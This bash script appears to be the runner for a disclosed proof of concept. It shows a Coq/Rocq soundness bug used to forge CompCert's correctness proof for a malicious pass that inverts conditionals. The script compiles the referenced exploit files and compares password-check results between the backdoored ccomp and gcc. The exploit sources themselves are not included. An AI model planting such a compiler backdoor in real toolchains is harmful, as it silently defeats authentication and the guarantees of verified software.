#!/usr/bin/env bash
set -euo pipefail

# ============================================================
#  CompCert Backdoor PoC — Runner
# ============================================================
#
#  Demonstrates a backdoored formally-verified C compiler:
#  the CompCert correctness proof still type-checks, but the
#  compiler silently inverts all if-then-else branches.
#
#  Tier 1 (proof level):
#    - Unsound.v proves False via CVE-2026-72714
#    - ForgedCorrectness.v proves the NEGATION of CompCert's
#      correctness theorem using that False
#    - Coq's kernel accepts both proofs
#
#  Tier 2 (compiler level):
#    - Backdoor.v defines a malicious Clight→Clight pass
#      that swaps if-then-else branches
#    - Backdoorproof.v "proves" semantic preservation (forged)
#    - The pass is wired into CompCert's pipeline
#    - The resulting ccomp binary miscompiles conditionals
#
#  Bug:    rocq-prover/rocq#22287
#  CVE:    CVE-2026-72714
# ============================================================

POC_DIR="/poc"
COMPCERT="/home/coq/compcert"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

banner() {
    printf "\n"
    printf "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}\n"
    printf "${CYAN}║${NC}  ${BOLD}CompCert Backdoor PoC${NC}                                      ${CYAN}║${NC}\n"
    printf "${CYAN}║${NC}  Backdoored verified C compiler via CVE-2026-72714           ${CYAN}║${NC}\n"
    printf "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}\n"
    printf "\n"
}

info() {
    printf "${CYAN}[*]${NC} %s\n" "$1"
}

pass() {
    printf "${GREEN}[✓]${NC} %s\n" "$1"
}

fail() {
    printf "${RED}[✗]${NC} %s\n" "$1"
}

divider() {
    printf "${YELLOW}────────────────────────────────────────────────────────────────${NC}\n"
}

# Source opam environment
eval $(opam env 2>/dev/null) || true

banner

# ── Version info ──────────────────────────────────────────────

COQ_VER=$(coqc --version 2>/dev/null | head -1 || echo "unknown")
info "Coq version: ${COQ_VER}"

# Extract just the version number (VERSION file has key=value lines)
if [ -f "$COMPCERT/VERSION" ]; then
    CC_VER=$(grep '^version=' "$COMPCERT/VERSION" 2>/dev/null | cut -d= -f2)
    [ -z "$CC_VER" ] && CC_VER="3.14"
else
    CC_VER="3.14"
fi
info "CompCert version: ${CC_VER}"
printf "\n"

# Track overall status
TIER1_OK=true
TIER2_OK=true

# ── Tier 1: Proof-level exploit ───────────────────────────────

printf "${BOLD}═══ TIER 1: Proof-Level Exploit ═══${NC}\n\n"

info "Exploit file (Unsound.v) — proves False via CVE-2026-72714:"
divider
cat "$POC_DIR/Unsound.v"
divider
printf "\n"

# Unsound.v was compiled during the CompCert build (it's in
# cfrontend/).  Verify the .vo exists.
if [ -f "$COMPCERT/cfrontend/Unsound.vo" ]; then
    pass "Unsound.vo exists — Coq kernel accepted proof of False"
else
    info "Compiling Unsound.v standalone..."
    cd "$COMPCERT"
    if coqc -R cfrontend compcert.cfrontend "$COMPCERT/cfrontend/Unsound.v" 2>&1; then
        pass "Unsound.v accepted — Coq kernel proved False"
    else
        fail "Unsound.v rejected — bug may be fixed in this Coq version"
        TIER1_OK=false
    fi
fi
printf "\n"

info "ForgedCorrectness.v — negation of CompCert's correctness theorem:"
divider
cat "$POC_DIR/ForgedCorrectness.v"
divider
printf "\n"

# ForgedCorrectness.v is NOT part of the CompCert build — it's
# a standalone demo.  Compile it now using CompCert's includes.
info "Compiling ForgedCorrectness.v against CompCert..."
cd "$COMPCERT"

# Get CompCert's Coq include flags from Makefile.config if possible,
# otherwise use a comprehensive fallback.
COQINCLUDES=""
if [ -f "$COMPCERT/Makefile.config" ]; then
    # Try to extract COQINCLUDES from the generated config
    COQINCLUDES=$(sed -n 's/^COQINCLUDES=//p' "$COMPCERT/Makefile.config" 2>/dev/null || echo "")
fi
if [ -z "$COQINCLUDES" ]; then
    COQINCLUDES=$(make -s print-includes 2>/dev/null || echo "")
fi
if [ -z "$COQINCLUDES" ]; then
    # Comprehensive fallback covering all CompCert directories
    COQINCLUDES="-R lib compcert.lib -R common compcert.common \
-R cfrontend compcert.cfrontend -R backend compcert.backend \
-R driver compcert.driver -R x86_64 compcert.x86_64 -R x86 compcert.x86 \
-R flocq Flocq -R MenhirLib MenhirLib"
fi

# Copy ForgedCorrectness.v into cfrontend/ so it finds Unsound
cp "$POC_DIR/ForgedCorrectness.v" "$COMPCERT/cfrontend/"

if coqc $COQINCLUDES "$COMPCERT/cfrontend/ForgedCorrectness.v" 2>&1; then
    pass "ForgedCorrectness.v accepted — CompCert's theorem AND its negation both hold"
else
    fail "ForgedCorrectness.v failed to compile"
    printf "${YELLOW}[!] Tier 1 partial: Unsound.v proved False, but ForgedCorrectness needs CompCert libs${NC}\n"
    TIER1_OK=false
fi

printf "\n"

# Verify the backdoor pass was compiled
if [ -f "$COMPCERT/cfrontend/Backdoor.vo" ] && [ -f "$COMPCERT/cfrontend/Backdoorproof.vo" ]; then
    pass "Backdoor.vo + Backdoorproof.vo compiled — forged proof accepted by Coq kernel"
else
    fail "Backdoor proof files missing — check build output"
    TIER1_OK=false
fi

# Verify Compiler.vo was built (proves the patched theorem type-checks)
if [ -f "$COMPCERT/driver/Compiler.vo" ]; then
    pass "Compiler.vo accepted — end-to-end correctness theorem still type-checks WITH backdoor"
else
    fail "Compiler.vo not found — correctness proof may have failed"
    TIER1_OK=false
fi

printf "\n"

# ── Tier 2: Compiler-level backdoor ──────────────────────────

printf "${BOLD}═══ TIER 2: Compiler-Level Backdoor ═══${NC}\n\n"

CCOMP="$COMPCERT/ccomp"

if [ ! -x "$CCOMP" ]; then
    fail "ccomp binary not found — CompCert build may have failed"
    printf "${YELLOW}[!] Tier 2 requires a full CompCert build (~30-60 min)${NC}\n"
    printf "${YELLOW}[!] The Dockerfile handles this; re-run: docker build -t compcert-backdoor-poc .${NC}\n"
    TIER2_OK=false
fi

if [ "$TIER2_OK" = true ]; then

info "Backdoored ccomp binary: $CCOMP"
printf "\n"

info "Test program (test_auth.c):"
divider
cat "$POC_DIR/test_auth.c"
divider
printf "\n"

# Compile with backdoored ccomp (use -stdlib since we didn't make install)
info "Compiling test_auth.c with BACKDOORED ccomp..."

if "$CCOMP" -stdlib "$COMPCERT/runtime" -o /tmp/test_auth_backdoored "$POC_DIR/test_auth.c" 2>&1; then
    pass "Compilation succeeded (backdoored ccomp)"
else
    fail "ccomp compilation failed"
    TIER2_OK=false
fi

printf "\n"

# Also compile with stock gcc for comparison
info "Compiling test_auth.c with stock gcc (reference)..."
if gcc -o /tmp/test_auth_stock "$POC_DIR/test_auth.c" 2>&1; then
    pass "GCC compilation succeeded (reference)"
else
    fail "GCC not available — skipping comparison"
    TIER2_OK=false
fi

fi  # TIER2_OK

# ── Behavior comparison ──────────────────────────────────────

if [ "$TIER2_OK" = true ]; then

printf "\n"
printf "${BOLD}── Behavior comparison ──${NC}\n\n"

# Run gcc version (reference — correct behavior)
info "GCC-compiled (correct behavior):"
GCC_OUTPUT=$(/tmp/test_auth_stock 2>&1 || true)
printf "%s\n" "$GCC_OUTPUT" | sed 's/^/  /'
printf "\n"

# Run backdoored version
info "Backdoored ccomp (inverted behavior):"
BD_OUTPUT=$(/tmp/test_auth_backdoored 2>&1 || true)
printf "%s\n" "$BD_OUTPUT" | sed 's/^/  /'
printf "\n"

# Parse return values to determine if backdoor is active
# Expected GCC:       check_password("s3cr3t") = 1, check_password("wrongpass") = 0
# Expected backdoor:  check_password("s3cr3t") = 0, check_password("wrongpass") = 1
GCC_R1=$(echo "$GCC_OUTPUT" | grep 's3cr3t' | grep -o '= [0-9]*' | grep -o '[0-9]*' || echo "?")
GCC_R2=$(echo "$GCC_OUTPUT" | grep 'wrongpass' | grep -o '= [0-9]*' | grep -o '[0-9]*' || echo "?")
BD_R1=$(echo "$BD_OUTPUT" | grep 's3cr3t' | grep -o '= [0-9]*' | grep -o '[0-9]*' || echo "?")
BD_R2=$(echo "$BD_OUTPUT" | grep 'wrongpass' | grep -o '= [0-9]*' | grep -o '[0-9]*' || echo "?")

BACKDOOR_DETECTED=false

if [ "$GCC_R1" = "1" ] && [ "$GCC_R2" = "0" ] && \
   [ "$BD_R1" = "0" ] && [ "$BD_R2" = "1" ]; then
    BACKDOOR_DETECTED=true
    pass "Backdoor confirmed: check_password return values are inverted"
    printf "    GCC:  correct password → %s (accept)   wrong password → %s (reject)\n" "$GCC_R1" "$GCC_R2"
    printf "    ccomp: correct password → %s (REJECT!)  wrong password → %s (ACCEPT!)\n" "$BD_R1" "$BD_R2"
elif [ "$BD_R1" != "$GCC_R1" ] || [ "$BD_R2" != "$GCC_R2" ]; then
    BACKDOOR_DETECTED=true
    pass "Backdoor detected: output differs between gcc and ccomp"
else
    fail "Backdoor not detected — outputs match (gcc vs ccomp)"
    TIER2_OK=false
fi

fi  # TIER2_OK

# ── Summary ──────────────────────────────────────────────────

printf "\n"

if [ "$TIER1_OK" = true ] && [ "$TIER2_OK" = true ] && [ "$BACKDOOR_DETECTED" = true ]; then
    # Full success
    printf "${RED}╔══════════════════════════════════════════════════════════════╗${NC}\n"
    printf "${RED}║${NC}  ${BOLD}SOUNDNESS BUG CONFIRMED — COMPILER BACKDOORED${NC}              ${RED}║${NC}\n"
    printf "${RED}║${NC}                                                              ${RED}║${NC}\n"
    printf "${RED}║${NC}  CompCert's Coq-verified correctness proof is meaningless.   ${RED}║${NC}\n"
    printf "${RED}║${NC}                                                              ${RED}║${NC}\n"
    printf "${RED}║${NC}  CVE-2026-72714 (Rocq #22287) allows proving False in the    ${RED}║${NC}\n"
    printf "${RED}║${NC}  same Coq kernel that checks CompCert's proofs.  From        ${RED}║${NC}\n"
    printf "${RED}║${NC}  False, we forge a semantic-preservation proof for a          ${RED}║${NC}\n"
    printf "${RED}║${NC}  malicious compiler pass that swaps if-then-else branches.   ${RED}║${NC}\n"
    printf "${RED}║${NC}                                                              ${RED}║${NC}\n"
    printf "${RED}║${NC}  Results:                                                    ${RED}║${NC}\n"
    printf "${RED}║${NC}    1. Coq kernel proves False                [Unsound.v]     ${RED}║${NC}\n"
    printf "${RED}║${NC}    2. CompCert's theorem is both true and    [ForgedCorr.v]  ${RED}║${NC}\n"
    printf "${RED}║${NC}       false in the same proof environment                    ${RED}║${NC}\n"
    printf "${RED}║${NC}    3. Backdoor pass has "verified" proof     [Backdoor*.v]   ${RED}║${NC}\n"
    printf "${RED}║${NC}    4. ccomp miscompiles conditionals         [test_auth.c]   ${RED}║${NC}\n"
    printf "${RED}║${NC}                                                              ${RED}║${NC}\n"
    printf "${RED}║${NC}  Target:     CompCert %-39s  ${RED}║${NC}\n" "${CC_VER}"
    printf "${RED}║${NC}  Coq:        %-48s  ${RED}║${NC}\n" "${COQ_VER}"
    printf "${RED}║${NC}  CVE:        CVE-2026-72714 (rocq-prover/rocq#22287)         ${RED}║${NC}\n"
    printf "${RED}║${NC}  Component:  Universe checking (flag leak through module)    ${RED}║${NC}\n"
    printf "${RED}║${NC}  Impact:     Any Coq-verified system using affected Coq      ${RED}║${NC}\n"
    printf "${RED}╚══════════════════════════════════════════════════════════════╝${NC}\n"
elif [ "$TIER1_OK" = true ]; then
    # Tier 1 worked but Tier 2 had issues
    printf "${YELLOW}╔══════════════════════════════════════════════════════════════╗${NC}\n"
    printf "${YELLOW}║${NC}  ${BOLD}SOUNDNESS BUG CONFIRMED (Tier 1)${NC}                            ${YELLOW}║${NC}\n"
    printf "${YELLOW}║${NC}                                                              ${YELLOW}║${NC}\n"
    printf "${YELLOW}║${NC}  Coq kernel is unsound — proves False via CVE-2026-72714.    ${YELLOW}║${NC}\n"
    printf "${YELLOW}║${NC}  CompCert's correctness theorem AND its negation both hold.  ${YELLOW}║${NC}\n"
    printf "${YELLOW}║${NC}  Tier 2 (compiler-level backdoor) had issues — see above.    ${YELLOW}║${NC}\n"
    printf "${YELLOW}║${NC}                                                              ${YELLOW}║${NC}\n"
    printf "${YELLOW}║${NC}  Target:     CompCert %-39s  ${YELLOW}║${NC}\n" "${CC_VER}"
    printf "${YELLOW}║${NC}  Coq:        %-48s  ${YELLOW}║${NC}\n" "${COQ_VER}"
    printf "${YELLOW}║${NC}  CVE:        CVE-2026-72714 (rocq-prover/rocq#22287)         ${YELLOW}║${NC}\n"
    printf "${YELLOW}╚══════════════════════════════════════════════════════════════╝${NC}\n"
else
    # Both tiers failed
    printf "${RED}╔══════════════════════════════════════════════════════════════╗${NC}\n"
    printf "${RED}║${NC}  ${BOLD}REPRODUCTION FAILED${NC}                                         ${RED}║${NC}\n"
    printf "${RED}║${NC}                                                              ${RED}║${NC}\n"
    printf "${RED}║${NC}  CVE-2026-72714 could not be reproduced.  The Coq version    ${RED}║${NC}\n"
    printf "${RED}║${NC}  may include the fix, or the build environment differs.       ${RED}║${NC}\n"
    printf "${RED}║${NC}                                                              ${RED}║${NC}\n"
    printf "${RED}║${NC}  Coq:        %-48s  ${RED}║${NC}\n" "${COQ_VER}"
    printf "${RED}║${NC}  CVE:        CVE-2026-72714 (rocq-prover/rocq#22287)         ${RED}║${NC}\n"
    printf "${RED}╚══════════════════════════════════════════════════════════════╝${NC}\n"
fi
printf "\n"
